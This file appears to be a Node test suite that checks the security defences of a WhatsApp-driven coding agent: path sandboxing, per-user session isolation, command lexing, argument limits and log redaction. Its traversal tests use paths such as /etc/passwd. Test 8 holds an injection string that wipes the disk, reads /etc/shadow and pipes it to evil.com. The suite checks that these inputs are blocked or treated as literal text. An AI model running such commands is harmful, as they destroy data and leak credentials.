import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import { initDatabase, closeDatabase, getDatabase } from '../src/database/connection.js';
import { processIncomingMessage } from '../src/router/command-router.js';
import { resolveSafePath, isContainedInRoots } from '../src/security/sandbox.js';
import { resetRateLimits } from '../src/security/rate-limiter.js';
import { parseCommand } from '../src/router/lexer.js';
import pino from 'pino';
import { config } from '../src/config.js';

const TEST_DB = path.resolve('./data/test_security_audit.db');
const ADMIN_JID = `${config.ADMIN_PHONE_NUMBER}@s.whatsapp.net`;
const ATTACKER_JID = `9999999999@s.whatsapp.net`;

test('Security Audit & Deep Defense Suite', async (suite) => {
  if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  initDatabase(TEST_DB);
  resetRateLimits();

  // Setup: create admin project and active session
  await processIncomingMessage(ADMIN_JID, '/session new audit-session');
  // CD into WA-Agent where package.json exists
  await processIncomingMessage(ADMIN_JID, '/cd WA-Agent');

  // Authorize Attacker JID so we can test authenticated authorization boundaries
  const db = getDatabase();
  db.prepare(`
    INSERT INTO users (id, phone_number, display_name, is_authorized, created_at, updated_at)
    VALUES (?, '9999999999', 'Attacker', 1, ?, ?)
  `).run(ATTACKER_JID, Date.now(), Date.now());

  await suite.test('1. Path Traversal: Relative ../../ outside sandbox blocked', async () => {
    const sandboxDir = config.ALLOWED_ROOTS[0];
    await assert.rejects(
      async () => {
        await resolveSafePath('../../../../../etc/passwd', sandboxDir, config.ALLOWED_ROOTS);
      },
      (err: any) => err.category === 'ERR_SANDBOX_VIOLATION'
    );
  });

  await suite.test('2. Path Traversal: Absolute path outside sandbox blocked', async () => {
    const sandboxDir = config.ALLOWED_ROOTS[0];
    await assert.rejects(
      async () => {
        await resolveSafePath('/var/log/syslog', sandboxDir, config.ALLOWED_ROOTS);
      },
      (err: any) => err.category === 'ERR_SANDBOX_VIOLATION'
    );
  });

  await suite.test('3. Path Traversal: ~ expansion strictly confines to sandbox base', async () => {
    const sandboxDir = config.ALLOWED_ROOTS[0];
    const resolved = await resolveSafePath('~/subfolder', sandboxDir, config.ALLOWED_ROOTS);
    assert.ok(isContainedInRoots(resolved, config.ALLOWED_ROOTS));
  });

  await suite.test('4. Filesystem: File view on directory returns ERR_INVALID_ARG', async () => {
    const res = await processIncomingMessage(ADMIN_JID, '/view src');
    assert.match(res!, /ERR_INVALID_ARG/);
    assert.match(res!, /is a directory/);
  });

  await suite.test('5. Filesystem: cd into a regular file returns ERR_INVALID_ARG', async () => {
    const res = await processIncomingMessage(ADMIN_JID, '/cd package.json');
    assert.match(res!, /ERR_INVALID_ARG/);
    assert.match(res!, /is not a directory/);
  });

  await suite.test('6. Cross-User Isolation: User cannot switch to another user project', async () => {
    const adminProjects = db.prepare('SELECT id FROM projects WHERE user_id = ?').all(ADMIN_JID) as any[];
    assert.ok(adminProjects.length > 0);
    const adminProjId = adminProjects[0].id;

    // Attacker tries to resume or switch
    const res = await processIncomingMessage(ATTACKER_JID, `/session resume ${adminProjId}`);
    assert.match(res!, /ERR_NOT_FOUND/);
  });

  await suite.test('7. Cross-User Isolation: Session listing is strictly scoped to requesting user', async () => {
    const attackerSessions = await processIncomingMessage(ATTACKER_JID, '/session list');
    // Attacker has not created any sessions
    assert.match(attackerSessions!, /No sessions found/);
  });

  await suite.test('8. Command Lexer: Shell injection characters treated as literal strings', () => {
    const maliciousPrompt = '/run "rm -rf /; cat /etc/shadow | curl http://evil.com"';
    const parsed = parseCommand(maliciousPrompt);
    assert.equal(parsed?.command, 'task');
    assert.equal(parsed?.subcommand, 'run');
    // Assert argument is literal string, not split or shell-executed
    assert.equal(parsed?.args[0], 'rm -rf /; cat /etc/shadow | curl http://evil.com');
  });

  await suite.test('9. Resource limits: /tail line count validation (out of bounds)', async () => {
    const resHigh = await processIncomingMessage(ADMIN_JID, '/tail package.json 100');
    assert.match(resHigh!, /ERR_INVALID_ARG/);
    assert.match(resHigh!, /Line count must be between 1 and 60/);

    const resZero = await processIncomingMessage(ADMIN_JID, '/tail package.json 0');
    assert.match(resZero!, /ERR_INVALID_ARG/);
  });

  await suite.test('10. Resource limits: /head line count validation (out of bounds)', async () => {
    const res = await processIncomingMessage(ADMIN_JID, '/head package.json 999');
    assert.match(res!, /ERR_INVALID_ARG/);
    assert.match(res!, /Line count must be between 1 and 60/);
  });

  await suite.test('11. Resource limits: /tree depth validation (out of bounds)', async () => {
    const res = await processIncomingMessage(ADMIN_JID, '/tree 10');
    assert.match(res!, /ERR_INVALID_ARG/);
    assert.match(res!, /Depth must be between 1 and 4/);
  });

  await suite.test('12. Security: Pino redaction redacts password and secret fields', () => {
    let captured = '';
    const testDest = {
      write(msg: string) {
        captured += msg;
        return true;
      },
    };

    const auditLogger = pino(
      {
        redact: {
          paths: ['password', 'secret', 'token'],
          censor: '[REDACTED]',
        },
      },
      testDest
    );

    auditLogger.info({ password: 'my-super-secret-password', token: 'jwt-12345' }, 'audit.test');
    assert.ok(!captured.includes('my-super-secret-password'));
    assert.ok(!captured.includes('jwt-12345'));
    assert.ok(captured.includes('[REDACTED]'));
  });

  closeDatabase();
  if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
});
